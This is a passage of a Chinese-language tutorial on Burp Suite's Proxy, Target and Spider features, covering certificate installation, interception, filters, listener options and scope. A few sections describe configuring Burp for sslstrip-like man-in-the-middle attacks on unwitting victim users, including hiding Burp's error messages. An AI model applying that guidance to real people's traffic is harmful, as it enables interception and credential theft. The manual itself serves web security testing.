class=\"line\">6.在证书路径选项卡点击PortSwigger CA,然后再点击查看证书 </span><br><span class=\"line\">7.在常规选项卡里点击安装证书 </span><br><span class=\"line\">8.在证书导入向导中，选择“将所有的证书放入下列存储区” </span><br><span class=\"line\">9.点击浏览 </span><br><span class=\"line\">10.以当前用户或者本机计算机都可以 </span><br><span class=\"line\">11.点击ok完成导入 </span><br><span class=\"line\">12.重启ie（不需要以管理员权限运行） 其它浏览器差不多具体请查看官网 </span><br></pre></td></tr></table></figure>\n\n<p><a href=\"http://portswigger.net/burp/Help/proxy_options_installingCAcert.html\">http://portswigger.net/burp/Help/proxy_options_installingCAcert.html</a></p>\n<h3 id=\"Intercept\"><a href=\"#Intercept\" class=\"headerlink\" title=\"Intercept\"></a>Intercept</h3><p>用于显示和修改HTTP请求和响应，通过你的浏览器和Web服务器之间。在BurpProxy的选项中，您可以配置拦截规则来确定请求是什么和响应被拦截(例如，范围内的项目，与特定文件扩展名，项目要求与参数，等)。 该面板还包含以下控制：</p>\n<h4 id=\"Forward\"><a href=\"#Forward\" class=\"headerlink\" title=\"Forward\"></a>Forward</h4><p>当你编辑信息之后，发送信息到服务器或浏览器</p>\n<h4 id=\"Drop\"><a href=\"#Drop\" class=\"headerlink\" title=\"Drop\"></a>Drop</h4><p>当你不想要发送这次信息可以点击drop放弃这个拦截信息</p>\n<h4 id=\"Interception-is-on-off\"><a href=\"#Interception-is-on-off\" class=\"headerlink\" title=\"Interception is on&#x2F;off\"></a>Interception is on&#x2F;off</h4><p>这个按钮用来切换和关闭所有拦截。如果按钮显示Interception is On，表示请求和响应将被拦截或自动转发根据配置的拦截规则配置代理选项。如果按钮显示Interception is off则显示拦截之后的所有信息将自动转发。</p>\n<h4 id=\"Action\"><a href=\"#Action\" class=\"headerlink\" title=\"Action\"></a>Action</h4><p>说明一个菜单可用的动作行为操作可以有哪些操作功能。</p>\n<h4 id=\"Comment-field\"><a href=\"#Comment-field\" class=\"headerlink\" title=\"Comment field\"></a>Comment field</h4><p>为请求或响应添加注释，以便更容易在History选项卡中识别它们。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120578170.png\" alt=\"Image011\" title=\"image011.png\"></p>\n<h4 id=\"Highlight\"><a href=\"#Highlight\" class=\"headerlink\" title=\"Highlight\"></a>Highlight</h4><p>为请求或响应添加颜色，可以在history选项卡和截获中更容易发现。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120669655.png\" alt=\"Image013\" title=\"image013.png\"></p>\n<h4 id=\"History\"><a href=\"#History\" class=\"headerlink\" title=\"History\"></a>History</h4><p>代理历史认为每个请求和响应。通过代理可以记录全部请求和响应。您可以过滤和注释这个信息来帮助管理它，并使用代理的历史来测试流程。History(代理历史)总在更新，即使你把Interception turned off(拦截关闭)，允许浏览不中断的同时还监测应用流量的关键细节。</p>\n<h4 id=\"History-Table\"><a href=\"#History-Table\" class=\"headerlink\" title=\"History Table\"></a>History Table</h4><p>表中显示已通过代理HTTP消息的所有请求，并且可以查看完整的你所做的任何修改和截获的信息的请求和响应。 表中包含以下字段：</p>\n<p><code># (请求索引号)、Host(主机)、Method(请求方式)、URL(请求地址)、Params(参数)、Edited(编辑)、Status(状态)、Length(响应字节长度)、MIME type(响应的MLME类型)、Extension(地址文件扩展名)、Title(页面标题)、Comment(注释)、SSL、IP(目标IP地址)、Cookies、Time(发出请求时间)、Listener port(监听端口)</code>。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120687800.png\" alt=\"Image015\" title=\"image015.png\"></p>\n<p>您可以通过单击任何列标题进行升序或降序排列。如果您在表中双击选择一个项目地址，会显示出一个详细的请求和响应的窗口。或者右击选择 <code>Show new history window</code></p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120625578.png\" alt=\"Image017\" title=\"image017.png\"></p>\n<h3 id=\"Display-Filter\"><a href=\"#Display-Filter\" class=\"headerlink\" title=\"Display Filter\"></a>Display Filter</h3><p>Proxy histroy有一个可以用来在视图中隐藏某些内容的功能，以使其更易于分析和你感兴趣的工作内容的显示过滤。 History Table上方的过滤栏描述了当前的显示过滤器。点击过滤器栏打开要编辑的过滤器选项。该过滤器可以基于以下属性进行配置：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120694811.png\" alt=\"Image019\" title=\"image019.png\"></p>\n<h4 id=\"Request-type\"><a href=\"#Request-type\" class=\"headerlink\" title=\"Request type\"></a>Request type</h4><p>Show only in-scope items–勾选则显示在范围内的项目，反之。</p>\n<h4 id=\"MIME-type\"><a href=\"#MIME-type\" class=\"headerlink\" title=\"MIME type\"></a>MIME type</h4><p>您可以设定是否显示或隐藏包含各种不同的MIME类型，如HTML，CSS或图像的响应。</p>\n<h4 id=\"Status-code\"><a href=\"#Status-code\" class=\"headerlink\" title=\"Status code\"></a>Status code</h4><p>您可以设定是否要显示或隐藏各种HTTP状态码响应。</p>\n<h4 id=\"Search-term\"><a href=\"#Search-term\" class=\"headerlink\" title=\"Search term\"></a>Search term</h4><p>您可以过滤对反应是否不包含指定的搜索词。您可以设定搜索词是否是一个文字字符串或正则表达式，以及是否区分大小写。如果您选择了“Negative search (消极搜索)”选项，然后不匹配的搜索词唯一的项目将被显示。</p>\n<h4 id=\"File-extension\"><a href=\"#File-extension\" class=\"headerlink\" title=\"File extension\"></a>File extension</h4><p>您可以设定是否要显示或隐藏指定的文件扩展名的项目。</p>\n<h4 id=\"Annotation\"><a href=\"#Annotation\" class=\"headerlink\" title=\"Annotation\"></a>Annotation</h4><p>您可以设定是否显示使用用户提供的评论或仅亮点项目。</p>\n<h4 id=\"Listener\"><a href=\"#Listener\" class=\"headerlink\" title=\"Listener\"></a>Listener</h4><p>你可以只显示特定的监听端口上接收的项目。测试访问控制时可能有用。 如果设置一个过滤器，隐藏一些项目，这些都没有被删除，只是隐藏起来，如果你取消设置相关的过滤器将再次出现。这意味着您可以使用筛选器来帮助您系统地研究了大量代理的历史来理解各种不同的请求显示。</p>\n<h3 id=\"Annotations\"><a href=\"#Annotations\" class=\"headerlink\" title=\"Annotations\"></a>Annotations</h3><p>您可以通过添加注释和批注亮点代理历史记录项。这可能是有用的描述不同要求的目的，并标记了进一步查看。 两种方式添加亮点： 1)使用在最左边的表列中的下拉菜单中突出显示单个项目。 2)可以突出显示使用上下文菜单中的“亮点”项目的一个或多个选定的项目。 两种方法添加注释： 1)双击相关条目，注释列中，添加或编辑就地评论。 2)发表评论使用上下文菜单中的“添加注释”项目的一个或多个选定的项目。 除了以上两种，您也可以注释项目，它们出现在拦截选项卡，这些都将自动出现在历史记录表。 当您已经注明想要的请求，您可以使用列排序和显示过滤器后迅速找到这些项目。</p>\n<h3 id=\"Options\"><a href=\"#Options\" class=\"headerlink\" title=\"Options\"></a>Options</h3><p>设置代理监听、请求和响应，拦截反应，匹配和替换，ssl等。</p>\n<h3 id=\"Proxy-Listeners\"><a href=\"#Proxy-Listeners\" class=\"headerlink\" title=\"Proxy Listeners\"></a>Proxy Listeners</h3><p>代理侦听器是侦听从您的浏览器传入的连接本地HTTP代理服务器。它允许您监视和拦截所有的请求和响应，并且位于BurpProxy的工作流的心脏。默认情况下，Burp默认监听12.0.0.1地址，端口8080。要使用这个监听器，你需要配置你的浏览器使用127.0.0.1:8080作为代理服务器。此默认监听器是必需的测试几乎所有的基于浏览器的所有Web应用程序。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120626419.png\" alt=\"Image021\" title=\"image021.png\"></p>\n<h4 id=\"1-Binding\"><a href=\"#1-Binding\" class=\"headerlink\" title=\"1)Binding\"></a>1)Binding</h4><p>这些设置控制Burp怎么代理监听器绑定到本地网络接口：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Bind to port---这是将被打开侦听传入连接的本地接口上的端口。你将需要使用一个没有被绑定被其他应用程序的闲置端口。</span><br><span class=\"line\">Bind to address---这是Burp绑定到本地接口的IP地址。</span><br></pre></td></tr></table></figure>\n\n<p>您可以绑定到刚刚127.0.0.1接口或所有接口，或任何特定的本地IP地址。</p>\n<p>注意：如果监听器绑定到所有接口或特定的非loopback接口，那么其他计算机可能无法连接到该侦听器。这可能使他们发起出站连接，从您的IP地址发起，并以访问代理服务器历史的内容，其中可能包含敏感数据，如登录凭据。你应该只启用此当你位于一个受信任的网络上。</p>\n<p>BurpSuite让您创建多个代理服务器的侦听器，并提供了丰富的控制自己的行为的配置选项。你可能偶尔需要进行测试时不寻常的应用，或与一些非基于浏览器的HTTP客户端进行合作，利用这些选项。</p>\n<h4 id=\"2-Request-Handling\"><a href=\"#2-Request-Handling\" class=\"headerlink\" title=\"2)Request Handling\"></a>2)Request Handling</h4><p>这些设置包括选项来控制是否BurpSuite重定向通过此侦听器接收到的请求：</p>\n<p><strong>Redirect to host</strong> - 如果配置了这个选项，Burp会在每次请求转发到指定的主机，而不必受限于浏览器所请求的目标。需要注意的是，如果你正使用该选项，则可能需要配置匹配&#x2F;替换规则重写的主机头中的请求，如果服务器中，您重定向请求预期，不同于由浏览器发送一个主机头。</p>\n<p><strong>Redirect to port</strong> - 如果配置了这个选项，Burp会在每次请求转发到指定的端口，而不必受限于浏览器所请求的目标。</p>\n<p><strong>Force use of SSL</strong> - 如果配置了这个选项，Burp会使用HTTPS在所有向外的连接，即使传入的请求中使用普通的HTTP。您可以使用此选项，在与SSL相关的响应修改选项结合，开展sslstrip般的攻击使用Burp，其中，强制执行HTTPS的应用程序可以降级为普通的HTTP的受害用户的流量在不知不觉中通过BurpProxy代理。</p>\n<p>注意：每一个重定向选项都可以单独使用。因此，例如，可以将所有请求重定向到一个特定的主机，同时保留原来的端口和协议在每个原始请求中使用。隐形BurpProxy的支持允许非代理感知客户端直接连接到监听。</p>\n<h4 id=\"3-Certificate\"><a href=\"#3-Certificate\" class=\"headerlink\" title=\"3)Certificate\"></a>3)Certificate</h4><p>这些设置控制呈现给客户端的SSL服务器的SSL证书。使用这些选项可以解决一些使用拦截代理时出现的SSL问题：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">你可以消除您的浏览器的SSL警报，并需要建立SSL例外。 </span><br><span class=\"line\">凡网页加载来自其他域的SSL保护的项目，您可以确保这些均可由浏览器加载，而不需要先手动接受每个引用的域代理的SSL证书。 </span><br><span class=\"line\">您可以与拒绝连接到服务器，如果接收到无效的SSL证书胖客户端应用程序的工作。 </span><br></pre></td></tr></table></figure>\n\n<p>下列选项可用：</p>\n<p><strong>Use a self-signed certificate</strong>—||-一个简单的自签名SSL证书提交给您的浏览器，它总是导致SSL警告。</p>\n<p><strong>Generate CA-signed per-host certificate</strong>—||-这是默认选项。安装后，BurpSuite创造了一个独特的自签名的证书颁发机构（CA）证书，并将此计算机上使用，每次BurpSuite运行。当你的浏览器发出SSL连接到指定的主机，Burp产生该主机，通过CA证书签名的SSL证书。您可以安装BurpSuite的CA证书作为在浏览器中受信任的根，从而使每个主机的证书被接受，没有任何警报。您还可以导出其他工具或Burp的其他实例使用CA证书。</p>\n<p><strong>Generate a CA-signed certificate with a specific hostname</strong>—||这类似于前面的选项;然而，Burp会产生一个单一的主机证书与每一个SSL连接使用，使用您指定的主机名。在进行无形的代理时，此选项有时是必要的，因为客户端没有发送连接请求，因此Burp不能确定SSL协议所需的主机名。你也可以安装BurpSuite的CA证书作为受信任的根。</p>\n<p><strong>Use a custom certificate</strong>—||-此选项使您可以加载一个特定的证书（在PKCS＃12格式）呈现给你的浏览器。如果应用程序使用它需要特定的服务器证书（例如一个给定序列号或证书链）的客户端应该使用这个选项。</p>\n<h4 id=\"4-Exporting-and-Importing-the-CA-Certificate\"><a href=\"#4-Exporting-and-Importing-the-CA-Certificate\" class=\"headerlink\" title=\"4)Exporting and Importing the CA Certificate\"></a>4)Exporting and Importing the CA Certificate</h4><p>您可以导出您安装特定的CA证书在其他工具或BurpSuite的其他情况下使用，并且可以导入证书Burp在当前实例使用。 您可以选择要导出的证书只（用于导入到您的浏览器或其他设备的信任），或者你可以同时导出的证书及其私钥。</p>\n<p>注意：您不应该透露的私钥证书给任何不可信的一方。拥有你的证书和密钥的恶意攻击者可能可以，即使你不使用Burp拦截浏览器的HTTPS流量。</p>\n<p>您也可以仅通过访问http:&#x2F;&#x2F;burp&#x2F;cert在浏览器中导出证书。它使HTTPS请求您的浏览器相同的证书，但在一些移动设备上安装时，设备通过一个URL来下载它是有帮助的。</p>\n<h3 id=\"Interception-Options\"><a href=\"#Interception-Options\" class=\"headerlink\" title=\"Interception Options\"></a>Interception Options</h3><p>设置控制哪些请求和响应都停滞用于查看和编辑在拦截选项卡。单独的设置将应用到请求和响应。</p>\n<p>在“Intercept”复选框确定是否有讯息拦截。如果它被选中，然后Burp应用配置的规则对每个消息，以确定它是否应该被拦截。</p>\n<p>个别规则可以激活或停用对每个规则的左边的复选框。规则可以被添加，编辑，删除，或使用按钮重新排序。规则可以在消息，包括域名， IP地址，协议， HTTP方法， URL，文件扩展名，参数，cookie ，头&#x2F;主体内容，状态代码，MIME类型， HTML页面标题和代理的几乎任何属性进行配置侦听端口。您可以配置规则来只拦截项目的网址是目标范围之内的。可以使用正则表达式对定义复杂的匹配条件。</p>\n<p>规则按顺序处理，并且使用布尔运算符AND和OR组合。这些都与处理简单的“从左到右”的逻辑，其中每个算子的范围，如下所示：（所有规则之前累积的结果）和&#x2F;或（当前规则的结果）所有活动的规则在每封邮件进行处理，并最终活动规则应用后的结果确定消息是否被拦截或转发的背景。“自动更新内容长度”复选框控件时，这已被用户修改是否Burp自动更新消息的Content-Length头。使用这个选项通常是必不可少的，当HTTP主体已被修改。</p>\n<p>如果有需求，可以在请求结束时自动修复丢失或多余的新行。如果编辑请求不包含标题下面一个空行，Burp会添加此。如果与含有URL编码参数的身体的编辑请求包含任何换行符在身体的末端，Burp就会删除这些。这个选项可以是有用的纠正，而手动编辑在拦截视图的要求，以避免发出无效的请求向服务器发出的错误。</p>\n<h3 id=\"Response-Modification\"><a href=\"#Response-Modification\" class=\"headerlink\" title=\"Response Modification\"></a>Response Modification</h3><p>设置用于执行自动响应的修改。您可以使用这些选项通过自动重写应用程序响应的HTML来完成各种任务。 下列选项在数据删除客户端控件可能是有用的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">显示隐藏的表单字段。 （有一个子选项，以突出强调取消隐藏栏在屏幕上，便于识别。 ）</span><br><span class=\"line\">启用已禁用的表单域</span><br><span class=\"line\">删除输入字段长度限制</span><br><span class=\"line\">删除的JavaScript表单验证</span><br></pre></td></tr></table></figure>\n\n<p>下列选项可用于禁止客户端逻辑用于测试目的（注意，这些特征并非设计用来作为NoScript的的方式进行安全防御）有用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">删除所有的JavaScript。</span><br><span class=\"line\">删除&lt;object&gt;标记。</span><br></pre></td></tr></table></figure>\n\n<p>下列选项可用于提供对受害用户的流量在不知不觉中被通过BurpSuite代理sslstrip般的攻击。您可以在与听者选项强制SSL的传出请求，以有效地从用户的连接剥离SSL一起使用这些：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">转换HTTPS为HTTP的链接。</span><br><span class=\"line\">删除cookie安全标志。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Match-and-Replace\"><a href=\"#Match-and-Replace\" class=\"headerlink\" title=\"Match and Replace\"></a>Match and Replace</h3><p>用于自动替换请求和响应通过代理的部分。对于每一个HTTP消息，已启用的匹配和替换规则依次执行，以及任何适用的替代品制成。规则可以分别被定义为请求和响应，对于消息头和身体，并且还特别为只请求的第一行。每个规则可以指定一个文字字符串或正则表达式来匹配，和一个字符串来替换它。对于邮件头，如果匹配条件，整个头和替换字符串匹配留空，然后头被删除。如果指定一个空的匹配表达式，然后替换字符串将被添加为一个新的头。有可协助常见任务的各种缺省规则 - 这些都是默认为禁用。 匹配多行区域。您可以使用标准的正则表达式语法来匹配邮件正文的多行区域。</p>\n<p>在替换字符串，组可以使用其次为索引$引用。所以下面的替换字符串将包含被匹配在上述正则表达式，该标记的名称：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120634416.png\" alt=\"Image023\" title=\"image023.png\"></p>\n<h3 id=\"SSL-Pass-Through\"><a href=\"#SSL-Pass-Through\" class=\"headerlink\" title=\"SSL Pass Through\"></a>SSL Pass Through</h3><p>用于指定目标Web服务器为其Burp会直接通过SSL连接。关于通过这些连接的请求或响应任何细节将在代理拦截视图或历史。</p>\n<p>通过SSL连接传递可以在这情况下是不能直接消除了客户端的SSL错误是非常有用 - 例如，在执行SSL证书钉扎的移动应用程序。如果应用程序访问多个域，或使用HTTP和HTTPS连接的混合，然后通过SSL连接到特定问题的主机仍然可以让您以正常方式使用Burp其他交通工作。</p>\n<p>如果启用该选项来自动添加客户端SSL协商失败的项目，然后BurpSuite会在客户端失败的SSL协议检测（例如，由于不承认BurpSuite的CA证书），并会自动将相关的服务器添加到SSL通通过列表。</p>\n<h3 id=\"Miscellaneous\"><a href=\"#Miscellaneous\" class=\"headerlink\" title=\"Miscellaneous\"></a>Miscellaneous</h3><p>控制Burp代理的行为的一些具体细节。下列选项可用：</p>\n<p><strong>Use HTTP&#x2F;1.0 in requests to server</strong> - 该选项控制BurpSuite代理是否强制在请求目标服务器的HTTP 1.0版。默认设置是使用任何的HTTP版本所使用的浏览器。然而，一些遗留服务器或应用程序可能需要1.0版本才能正常工作。</p>\n<p><strong>Use HTTP&#x2F;1.0 in responses to client</strong> - 目前所有的浏览器都支持这两个版本1.0和HTTP 1.1 。从1.0版本开始已经减少了一些功能，迫使使用1.0版本有时会很有用，以控制浏览器的行为的各个方面，例如防止企图执行HTTP流水线。</p>\n<p><strong>Set response header “Connection:close”</strong> - 这个选项也可能是有用的，以防止HTTP流水线在某些情况下。</p>\n<p><strong>Unpack gzip &#x2F; deflate in requests</strong> - 某些应用程序（通常是那些使用自定义客户端组件） ，压缩在请求消息体。该选项控制BurpProxy是否自动解压缩压缩请求主体。请注意，某些应用程序可能被破坏，如果他们期望的压缩体和压缩已通过Burp被删除。</p>\n<p><strong>Unpack gzip &#x2F; deflate in responses</strong> - 大多数浏览器接受的gzip和响应紧缩压缩的内容。该选项控制BurpSuite代理是否自动解压缩压缩响应机构。请注意，您可以经常防止服务器试图通过删除请求（可能使用BurpProxy的匹配和替换功能）的Accept-Encoding头压缩的响应。 Disable web interface at http:&#x2F;&#x2F;burp - 如果你不得不配置你的听众接受无保护的接口上的连接，并希望阻止他人接触到Burp浏览器控件，此选项可能有用。</p>\n<p><strong>Suppress Burp error messages</strong> - 当某些错误时，默认情况下BurpSuite返回有意义的错误信息到浏览器。如果你想在隐身模式下运行Burp，履行人在这方面的中间人攻击的受害者用户，那么它可能是有用的抑制这些错误信息来掩盖一个事实，即Burp是参与。</p>\n<p><strong>Disable logging to history and site map</strong> - 此选项可以防止Burp从记录任何请求到代理服务器的历史或目标站点地图。如果您使用的是Burp代理对于一些特定用途，如身份验证到上游服务器或进行匹配和替换操作，并且要避免产生内存和存储开销采伐牵扯它可能是有用的。</p>\n<p><strong>Enable interception at startup</strong>- 此选项可让您设定是否在Burp时启动代理截获应该启用。您可以选择始终启用拦截，始终禁用拦截，或者从Burp上次关闭恢复设置。</p>\n<h2 id=\"Target功能\"><a href=\"#Target功能\" class=\"headerlink\" title=\"Target功能\"></a>Target功能</h2><p>目标工具包含了SiteMap，用你的目标应用程序的详细信息。它可以让你定义哪些对象在范围上为你目前的工作，也可以让你手动测试漏洞的过程。</p>\n<h3 id=\"Using-Burp-Target\"><a href=\"#Using-Burp-Target\" class=\"headerlink\" title=\"Using Burp Target\"></a>Using Burp Target</h3><p>在地址栏输入www.baidu.com，如图</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120617724.jpg\" alt=\"Image025\" title=\"image025.jpg\"></p>\n<p>这样看起来site map是不是很乱，则可以右击add to scope，然后点击Filter勾选Show only in-scope items，此时你再回头看Site map就只有百度一个地址了，这里filter可以过滤一些参数，show all显示全部，hide隐藏所有，如果勾选了表示不过滤</p>\n<p><img src=\"/../images_result/images/2014101711120751588.jpg\" alt=\"Image027\" title=\"image027.jpg\"></p>\n<p>针对地址右击显示当前可以做的一些动作操作等功能。左图 针对文件右击显示当前可以做一些动作操作等功能。右图</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120751588.jpg\" alt=\"Image029\" title=\"image029.jpg\"> <img src=\"https://wooyun.js.org/images_result/images/2014071402582281360.jpg\" alt=\"Image031\" title=\"image031.jpg\"></p>\n<h3 id=\"2-Scope\"><a href=\"#2-Scope\" class=\"headerlink\" title=\"2)Scope\"></a>2)Scope</h3><p>这个主要是配合Site map做一些过滤的功能，如图：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120768777.png\" alt=\"Image033\" title=\"image033.png\"></p>\n<p>Include in scope就是扫描地址或者拦截历史记录里右击有个add to scope就是添加到这了，也可以自己手动添加。</p>\n<p>Target分为site map和scope两个选项卡</p>\n<h4 id=\"SiteMap\"><a href=\"#SiteMap\" class=\"headerlink\" title=\"SiteMap\"></a>SiteMap</h4><p>中心Site Map汇总所有的信息Burp已经收集到的有关地址。你可以过滤并标注此信息，以帮助管理它，也可以使用SiteMap来手动测试工作流程。</p>\n<h4 id=\"Target-Information\"><a href=\"#Target-Information\" class=\"headerlink\" title=\"Target Information\"></a>Target Information</h4><p>SiteMap会在目标中以树形和表形式显示，并且还可以查看完整的请求和响应。树视图包含内容的分层表示，随着细分为地址，目录，文件和参数化请求的URL 。您还可以扩大有趣的分支才能看到进一步的细节。如果您选择树的一个或多个部分，在所有子分支所选择的项目和项目都显示在表视图。</p>\n<p>该表视图显示有关每个项目（URL ， HTTP状态代码，网页标题等）的关键细节。您可以根据任意列进行排序表（单击列标题来循环升序排序，降序排序，和未排序） 。如果您在表中选择一个项目，请求和响应（如适用）该项目显示在请求&#x2F;响应窗格。这包含了请求和响应的HTTP报文的编辑器，提供每封邮件的详细分析。</p>\n<p>站点地图汇总所有的信息BurpSuite已经收集到的有关申请。这包括：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">所有这一切都通过代理服务器直接请求的资源。</span><br><span class=\"line\">已推断出通过分析响应代理请求的任何物品（前提是你没有禁用被动Spider） 。</span><br><span class=\"line\">内容使用Spider或内容发现功能查找。</span><br><span class=\"line\">由用户手动添加的任何项目，从其它工具的输出。</span><br></pre></td></tr></table></figure>\n\n<p>已请求在SiteMap中的项目会显示为黑色。尚未被请求的项目显示为灰色。默认情况下（与被动蜘蛛(passviely scan this host)启用） ，当你开始浏览一个典型的应用，大量的内容将显示为灰色之前，你甚至得到尽可能要求，因为BurpSuite发现在您所请求的内容链接到它。您可以删除不感兴趣的地址</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120832954.png\" alt=\"Image035\" title=\"image035.png\"></p>\n<h4 id=\"Display-Filter-1\"><a href=\"#Display-Filter-1\" class=\"headerlink\" title=\"Display Filter\"></a>Display Filter</h4><p>Sitemap可以用来隐藏某些内容从视图中，以使其更易于分析和对你感兴趣的工作内容的显示过滤器 Sitemap上方的过滤栏描述了当前的显示过滤器。点击过滤器栏打开要编辑的过滤器选项。该过滤器可以基于以下属性进行配置：</p>\n<p>Request type 你可以只显示在范围内的项目，只能与反应项目，或者带参数的请求。 MIME type 您可以设定是否显示或隐藏包含各种不同的MIME类型，如HTML，CSS或图像的响应。 Status code 您可以设定是否要显示或隐藏各种HTTP状态码响应。 Search term 您可以过滤对反应是否不包含指定的搜索词。您可以设定搜索词是否是一个文字字符串或正则表达式，以及是否区分大小写。如果您选择了“消极搜索”选项，然后不匹配的搜索词唯一的项目将被显示。 File extension 您可以设定是否要显示或隐藏指定的文件扩展名的项目。 Annotation 您可以设定是否显示使用用户提供的评论或仅亮点项目。</p>\n<h4 id=\"Annotations-1\"><a href=\"#Annotations-1\" class=\"headerlink\" title=\"Annotations\"></a>Annotations</h4><p>通过添加注释和批注亮点代理历史记录项。这可能是有用的描述不同要求的目的，并标记了进一步查看。</p>\n<p>您可以通过添加注释和批注亮点代理历史记录项。这可能是有用的描述不同要求的目的，并标记了进一步查看。</p>\n<p>两种方式添加亮点：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)使用在最左边的表列中的下拉菜单中突出显示单个项目。</span><br><span class=\"line\">2)可以突出显示使用上下文菜单中的“亮点”项目的一个或多个选定的项目。</span><br><span class=\"line\">两种方法添加注释：</span><br><span class=\"line\">3)双击相关条目，注释列中，添加或编辑就地评论。</span><br><span class=\"line\">4)发表评论使用上下文菜单中的“添加注释”项目的一个或多个选定的项目。</span><br></pre></td></tr></table></figure>\n\n<p>除了以上两种，您也可以注释项目，它们出现在拦截选项卡，这些都将自动出现在历史记录表。 当您已经注明想要的请求，您可以使用列排序和显示过滤器后迅速找到这些项目。</p>\n<h4 id=\"Scope\"><a href=\"#Scope\" class=\"headerlink\" title=\"Scope\"></a>Scope</h4><p>Target scope设置，可以从SiteMap中添加也可以手动添加扫描范围到Scope。你可以在Target SiteMap和Proxy history上设置只显示在范围内的项目。并且可以设置代理拦截只有在范围内的请求和响应。Spider会扫描在范围内的地址。专业版还可以设置自动启动在范围内项目的漏洞扫描。您可以配置Intruder和Repeater跟随重定向到任何在范围内的网址。发送Burp目标以适当的方式执行行动，只针对你感兴趣并愿意攻击项目。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120869997.png\" alt=\"Image037\" title=\"image037.png\"></p>\n<p>范围定义使用的URL匹配规则两个表 - 一个“包括(include)”列表和“exclude(排除)”列表中。Burp根据一个URL地址来决定，如果它是目标范围之内，这将被视为是在范围上如果URL匹配至少一个“include”在内的规则，不符合“exclude”规则。这样能够定义特定的主机和目录为大致范围内，且距离该范围特定的子目录或文件（如注销或行政职能）排除。</p>\n<h2 id=\"Spider功能\"><a href=\"#Spider功能\" class=\"headerlink\" title=\"Spider功能\"></a>Spider功能</h2><p>Burp Spider 是一个映射 web 应用程序的工具。它使用多种智能技术对一个应用程序的内容和功能进行全面的清查。 通过跟踪 HTML 和 JavaScript 以及提交的表单中的超链接来映射目标应用程序，它还使用了一些其他的线索，如目录列表，资源类型的注释，以及 robots.txt 文件。 结果会在站点地图中以树和表的形式显示出来，提供了一个清楚并非常详细的目标应用程序 视图。能使你清楚地了解到一个 web 应用程序是怎样工作的，让你避免进行大量 的手动任务而浪费时间，在跟踪链接，提交表单，精简 HTNL 源代码。可以快速地确人应 用程序的潜在的脆弱功能，还允许你指定特定的漏洞，如 SQL 注入，路径遍历。</p>\n<h3 id=\"Using-Burp-Spider\"><a href=\"#Using-Burp-Spider\" class=\"headerlink\" title=\"Using Burp Spider\"></a>Using Burp Spider</h3><p>要对应用程序使用 Burp Spider 需要两个简单的步骤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 使用 Burp Proxy 配置为你浏览器的代理服务器，浏览目标应用程序(为了节省时间，你可 以关闭代理拦截)。 </span><br><span class=\"line\">2 到站点地图的”target”选项上，选中目标应用程序驻留的主机和目录。选择上下文菜单的” spider this host/branch”选项。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120832553.png\" alt=\"Image039\" title=\"image039.png\"></p>\n<p>你也可以在任何 Burp 工具的任意请求或响应上使用上下文菜单上选择” spider this item”。当你发送一个站点地图的分支来 spidering，Spider 会首先检查这个分支是否在定义好的spidering 的范围内。如果不是，Burp 会提示你是否把相关的 URL 添加到范围里。然后，Burp 开始 spidering，并执行下面的操作：</p>\n<p>在分支上，请求那些已被发现的还没被请求过的 URL。 在分支上，提交那些已被发现但提交 URL 错误的表单。 重复请求分支上的先前收到的状态码为 304 的项，为检索到一个应用程序的新(未进入缓存)副本。 对所有的检索到内容进行解析以确认新的 URL 和表单。 只有发现新内容就递归地重复这些步骤。 继续在所有的范围区域内 spidering，直到没有新内容为止。</p>\n<p>注意 Spider 会跟踪任何在当前定义的 spidering 范围内的 URL 链接。如果你定义了一个 范围比较大的目标，并且你只选择了其中的一个分支来 spidering，这时 Spider 会跟踪所有进入到这个比较大的范围内的链接，于是也就不在原来的分支上 spider。为了确保 Spider 只在指定分支内的请求上，你应该在开始时，就把 spidering 范围配置为只在这个分支上。</p>\n<p>你应该小心地使用 Burp Spider。在它的默认设置上，Spider 会在 spidering 范围内使用 默认输入值，自动地提交任意表格，并且会请求许多平常用户在只使用一个浏览器不会发出 的请求。如果在你定义范围的 URL 是用来执行敏感操作的，这些操作都会被带到应用程序 